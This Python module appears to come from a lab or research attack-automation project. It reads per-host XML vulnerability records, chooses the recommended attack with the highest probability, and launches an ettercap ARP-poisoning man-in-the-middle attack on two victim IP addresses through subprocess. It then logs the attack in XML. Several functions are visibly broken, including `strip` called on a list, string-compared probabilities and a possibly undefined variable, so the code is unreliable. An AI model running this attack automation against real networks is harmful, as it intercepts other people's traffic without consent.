# *********************************************#
# Module: React
# Purpose: Take recommendations from the network entities
# verify required conditions exist. Launch attack. Update
# success or failutre based on user input
# Main FCN: React()
# *********************************************#

import xml.etree.ElementTree as ET
import subprocess
from datetime import datetime


# *********************************************#
# Function: GetVulnerabilities
# Purpose: Finds vulnerabilities in each XML file and
# returns them to the calling function along with their
# probability and any requirements
# Input: None
# Output: (vlist, prob) vlist is a matrix containing
# vectors of IP addresses with recommended attacks, the attack
# and further requirements for the attack
# vlist looks like: [['A', '192.168.120.3', 'MiTM-Ettercap', 'B'],
# ['192.168.120.10', 'DOS-Cain and Able'],
# prob is a vector of probabilities of each of the vlist addresses
# prob looks like: ['0.625', '0.6', '0.625']
# *********************************************#
def GetVulnerabilities():
    ilist = GetIPAddresses()
    vlist = []
    prob = []
    for i in ilist:
        filen = 'IP' + i + '.xml'
        tree = ET.parse(filen)
        root = tree.getroot()
        hold = []
        for v in root.iter("State"):
            for s in v.iter("Vulnerability"):
                hold.append(s.text.strip())
        for rc in root.iter("Recommend"):
            hold.append(root.text.strip())
            hold.append(rc.text.strip())
            for pr in rc.iter("Prob"):
                prob.append(pr.text.strip())
            for rq in rc.iter("Requires"):
                hold.append(rq.text.strip())
            vlist.append(hold)
    return (vlist, prob)


# *********************************************#
# Function: FindVul
# Purpose: Finds a specific vulnerability from all of the IP
# addresses. Used to see if additional requirements are met
# Input: fv - name of the vulnerabilty to be found i.e., 'B'
# Output: IP- returns first IP address of a entity with that
# vulnerability
# *********************************************#
def FindVul(fv):
    ilist = GetIPAddresses()
    IP = 'No IP Found'
    for i in ilist:
        filen = 'IP' + i + '.xml'
        tree = ET.parse(filen)
        root = tree.getroot()
        for vul in root.iter('Vulnerability'):
            if vul.text.strip() == fv.strip():
                IP = root.text.strip()
    return IP


# *********************************************#
# Function: runEttercap
# Purpose: Runs the ettercap program from the command line
# Input: victim1 and victim2- IP addresses of the two entities we'd like to
# perform a MiTM attack on
# Output: True - denotes attack called
# *********************************************#
def runEttercap(victim1, victim2):
    # command = ["C:\\Program Files\\Ettercap Development Team\\Ettercap-0.7.4\\ettercap.exe", '-T', '-M', 'arp:remote', '/'+ victim1+ '/', '/'+ victim2 + '/']
    # subprocess.call(command)
    command = ["/usr/local/bin/ettercap", '-T', '-M', 'arp:remote', '/' + victim1 + '/', '/' + victim2 + '/']
    subprocess.call(command)
    update(victim1, True, 'MiTM-Ettercap')
    return True


# *********************************************#
# Function: update
# Purpose: Updates the entity xml with the time date and success
# (or failure) of the attack
# Input: IP - network entity IP address, Success- success or failure
# Attack - what attack was performed
# Output: True - denotes update complete
# *********************************************#
def update(IP, Success, Attack):
    filen = 'IP' + IP + '.xml'
    tree = ET.parse(filen)
    root = tree.getroot()
    t = datetime.now().strftime("%Y-%m-%d %I:%M%p")
    if Success == True:
        AElem = ET.SubElement(root, 'AttackPerformed')
        AElem.text = Attack.strip()
        TElem = ET.SubElement(AElem, 'TimeStamp')
        TElem.text = t.strip()
    tree.write(filen, 'us-ascii')
    return True


# *********************************************#
# Function: GetIPAddresses
# Purpose: pulls all IP addresses from the master list and returns a vector with them
# Input: None
# Output: vector list of IP addresses
# Looks like: ['192.168.120.3', '192.168.120.4', '192.168.120.10', '192.168.120.150']
# *********************************************#
def GetIPAddresses():
    tree = ET.parse('IPAddressIndex.xml')
    root = tree.getroot()
    IPAddList = []
    for IP in root.iter('IP'):
        IPAddList.append(IP.text.strip())
    return IPAddList


# *********************************************#
# Function: React
# Purpose: gets list of possible attacks, probabilities and requirements
# finds highest probability, if requirements are met it launches that attack
# if they are not it goes to the next highest probabilty and continues to check
# until it can launch. Then it updates.
# Input: None
# Output: Success- tells GUI that react module completed
# *********************************************#
def React():
    (vlist, prob) = GetVulnerabilities()
    p = prob.index(max(prob))
    attack = vlist[p]

    if len(attack) > 3:
        v2 = FindVul(attack[3])
    if attack[2].strip() == 'MiTM-Ettercap':
        runEttercap(attack[1], v2)
    if attack[2].strip() == 'DOS-Cain and Able':
        print('No current attack...sorry')

    return 'Success', attack[0], attack[2]


# *********************************************#
# Function: UpdateSuccess
# Purpose: Updates Exploit XML probability for that attack with
# success.
# Input: Vul - vulnerability exploited
# Attack - attack launched for that vulnerability
# Output: 'Updated' to indicate that update has completed
# *********************************************#
def UpdateSuccess(Vul, Attack):
    tree = ET.parse("Exploits.xml")
    root = tree.getroot()
    for V in root.iter("Vulnerability"):
        if V.text.strip() == Vul.strip():
            for A in V.iter("Recommend"):
                if A.text.strip() == Attack.strip():
                    for P in A.iter("Prob"):
                        k = P.text.split(":").strip()
                        k[0] = int(k[0]) + 1
                        k[1] = int(k[1]) + 1
                        m = str(k[0]) + ":" + str(k[1])
                        P.text = m.strip()
    tree.write("Exploits.xml", 'us-ascii')
    return 'Updated'


# *********************************************#
# Function: UpdateFailure
# Purpose: Updates Exploit XML probability for that attack with
# failure.
# Input: Vul - vulnerability exploited
# Attack - attack launched for that vulnerability
# Output: 'Updated' to indicate that update has completed
# *********************************************#
def UpdateFailure(Vul, Attack):
    tree = ET.parse("Exploits.xml")
    root = tree.getroot()
    for V in root.iter("Vulnerability"):
        if V.text.strip() == Vul.strip():
            for A in V.iter("Recommend"):
                if A.text.strip() == Attack.strip():
                    for P in A.iter("Prob"):
                        k = P.text.split(":").strip()
                        k[1] = int(k[1]) + 1
                        m = k[0] + ":" + str(k[1])
                        P.text = m.strip()

    tree.write("Exploits.xml", 'us-ascii')
    return 'Updated'


if __name__ == '__main__':
    React()
